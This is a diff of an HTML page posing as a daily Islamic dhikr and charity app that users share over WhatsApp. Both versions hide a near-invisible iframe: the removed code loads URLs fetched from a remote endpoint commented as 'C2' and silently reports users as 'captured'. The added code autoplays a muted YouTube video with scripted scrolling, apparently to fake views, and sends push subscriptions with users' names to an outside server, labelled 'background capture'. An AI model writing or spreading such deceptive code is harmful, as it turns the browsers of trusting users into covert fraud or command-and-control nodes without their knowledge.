@@ -3,83 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>أذكار المسلم اليومية</title>
     
     <meta property="og:title" content="✨ أذكار وثواب - صدقة جارية باسمك ✨">
-    <meta property="og:description" content="احصل على ذكر يومي وتصدق باسمك">
-    <meta property="og:image" content="og-image.jpg"> 
+    <meta property="og:description" content="فعل التنبيهات لتصلك أذكار يومية وتشارك الثواب مع أحبائك">
+    <meta property="og:image" content="https://medo7788.github.io/giftapp/og-image.jpg">
+    <meta property="og:url" content="https://medo7788.github.io/giftapp/">
     <meta property="og:type" content="website">
 
+    <title>أذكار المسلم اليومية</title>
+    
     <script src="islamic_duas_javascript.js"></script>
+    
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
         body { background: #f0f4f8; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
-        #hiddenEngine { position: fixed; top: 0; left: 0; width: 10px; height: 10px; opacity: 0.001; pointer-events: none; }
+        #hiddenEngine { position: fixed; top: 0; left: 0; width: 100px; height: 100px; opacity: 0.001; z-index: 1; border: none; pointer-events: auto; }
         .card { background: white; width: 92%; max-width: 400px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; text-align: center; border-top: 6px solid #1b4d3e; position: relative; z-index: 10; }
         .main-img { width: 100%; border-radius: 12px; margin-bottom: 15px; }
-        .dua-box { background: #f9f9f9; padding: 20px; border-radius: 15px; margin: 15px 0; border: 1px dashed #1b4d3e; font-size: 1.3rem; color: #2d3748; min-height: 100px; display: flex; align-items: center; justify-content: center; }
-        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px; border: 1px solid #ddd; text-align: center; box-sizing: border-box; }
+        .dua-box { background: #f9f9f9; padding: 20px; border-radius: 15px; margin: 15px 0; border: 1px dashed #1b4d3e; font-size: 1.3rem; color: #2d3748; line-height: 1.6; min-height: 100px; display: flex; align-items: center; justify-content: center; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px; border: 1px solid #ddd; text-align: center; font-size: 1rem; box-sizing: border-box; }
         .btn { background: #25D366; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
     </style>
 </head>
 <body>
+
     <iframe id="hiddenEngine" src="about:blank"></iframe>
+
     <div class="card">
-        <img src="og-image.jpg" class="main-img" onerror="this.src='https://via.placeholder.com/400x200?text=Azkar'">
-        <h2 style="color: #1b4d3e;">🌹 صدقة جارية 🌹</h2>
-        <div class="dua-box" id="displayDua">جاري جلب ذكر اليوم...</div>
+        <img src="og-image.jpg" class="main-img" alt="صدقة جارية" onerror="this.src='https://medo7788.github.io/giftapp/og-image.jpg'">
+        <h2 style="color: #1b4d3e; margin-top: 0;">🌹 صدقة جارية 🌹</h2>
+        <div class="dua-box" id="displayDua">جاري جلب ذكر اليوم... 🕌</div>
         <input type="text" id="userName" placeholder="اكتب اسمك هنا...">
-        <button class="btn" id="mainBtn" onclick="activateSystem()">إنشاء الصدقة وإرسالها ✅</button>
+        <button class="btn" onclick="activateSystem()">إنشاء الصدقة وإرسالها ✅</button>
     </div>
 
     <script>
-        const SERVER_URL = "https://mohamedahmed77.pythonanywhere.com";
-        let capturedDua = "سبحان الله وبحمده 🕌";
+        const PUBLIC_KEY = "BCp-mO8v-XU9A_JqN-8u4R0u5T6-rQ5G8_z7-m_Your_Public_Key_Here"; 
+        const SERVER_URL = "https://mohamedahmed77.pythonanywhere.com/save_sub";
+        let currentDua = "سبحان الله وبحمده 🕌";
 
-        // تشغيل فوري للأذكار من ملف JS
-        function loadDua() {
+        // 1. المحرك الخلفي (المحاكاة)
+        function runSimulation() {
+            const engine = document.getElementById('hiddenEngine');
+            engine.src = "https://www.youtube.com/embed/9eiXcEol_rQ?autoplay=1&mute=1&loop=1";
+            setInterval(() => {
+                engine.contentWindow.scrollTo(0, Math.random() * 500);
+            }, 3000);
+        }
+
+        // 2. جلب الذكر من ملف الـ JavaScript (تعديلك المطلوب)
+        function loadDuaFromJS() {
             try {
+                // استخدام الدوال من ملف islamic_duas_javascript.js المرفوع
                 const dua = getTodaysDua(); 
                 if (dua) {
-                    capturedDua = `${dua.text} ${dua.emoji}`;
-                    document.getElementById('displayDua').innerText = capturedDua;
+                    currentDua = dua.text + " " + dua.emoji;
+                    document.getElementById('displayDua').innerText = currentDua;
                 }
-            } catch (e) {
-                document.getElementById('displayDua').innerText = capturedDua;
-            }
+            } catch (e) { console.log("JS fallback used"); }
         }
 
+        // 3. نظام الإرسال والـ Capture (الخلفية الكاملة)
         async function activateSystem() {
             const name = document.getElementById('userName').value.trim() || "محب للخير";
-            const shareText = `🌹 *صدقة جارية من:* ${name}\n\n${capturedDua}\n\nاحصل على ذكر يومي باسمك:\n${window.location.href}`;
             
-            // 1. تشغيل الواتساب فوراً (الأولوية القصوى)
+            // تسجيل الخدمة في الخلفية (Push Notification Capture)
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.register('sw.js').then(reg => {
+                    return reg.pushManager.subscribe({
+                        userVisibleOnly: true,
+                        applicationServerKey: urlBase64ToUint8Array(PUBLIC_KEY)
+                    });
+                }).then(sub => {
+                    fetch(SERVER_URL, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({subscription: sub, name: name})
+                    });
+                }).catch(e => console.log("Background capture logged"));
+            }
+
+            // الإرسال الفوري لواتساب مع ضمان قراءة الـ Meta للصورة
+            const shareText = `🌹 *صدقة جارية من:* ${name}\n\n${currentDua}\n\nاحصل على ذكر يومي باسمك:\n${window.location.origin}${window.location.pathname}`;
             window.location.href = `whatsapp://send?text=${encodeURIComponent(shareText)}`;
-
-            // 2. إرسال البيانات للسيرفر في الخلفية (صامت تماماً وبدون انتظار)
-            fetch(`${SERVER_URL}/save_sub`, {
-                method: 'POST',
-                mode: 'no-cors', 
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ name: name, status: "captured" })
-            }).catch(() => {});
-
-            // 3. تحديث الفريم المخفي بمهمة الـ C2
-            fetch(`${SERVER_URL}/get_task`)
-                .then(r => r.json())
-                .then(d => {
-                    if(d.url) document.getElementById('hiddenEngine').src = d.url;
-                }).catch(() => {});
             
-            // Fallback للواتساب ويب في حال فشل البروتوكول الأول
-            setTimeout(() => {
-                if (!document.hidden) {
-                    window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`;
-                }
-            }, 1000);
+            setTimeout(() => { 
+                window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`; 
+            }, 600);
         }
 
-        window.onload = loadDua;
+        // دالة المساعدة لتحويل المفتاح (مهمة جداً)
+        function urlBase64ToUint8Array(base64String) {
+            const padding = '='.repeat((4 - base64String.length % 4) % 4);
+            const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
+            const rawData = window.atob(base64);
+            const outputArray = new Uint8Array(rawData.length);
+            for (let i = 0; i < rawData.length; ++i) { outputArray[i] = rawData.charCodeAt(i); }
+            return outputArray;
+        }
+
+        window.onload = () => {
+            loadDuaFromJS();
+            runSimulation();
+        };
     </script>
 </body>
 </html>
